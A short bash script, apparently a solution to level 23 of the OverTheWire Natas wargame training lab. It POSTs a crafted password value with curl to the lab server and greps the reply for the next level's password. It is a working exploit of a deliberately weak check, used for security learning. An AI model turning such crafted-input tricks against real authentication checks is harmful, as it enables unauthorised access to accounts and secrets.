#!/bin/bash
if [ $# -eq 0 ] ; then
  echo "Please pass the password as argument"
  exit
fi
curl -s --user natas23:$1 --data "passwd=11iloveyou" http://natas23.natas.labs.overthewire.org/ | grep -E -o "Password: .{32}"
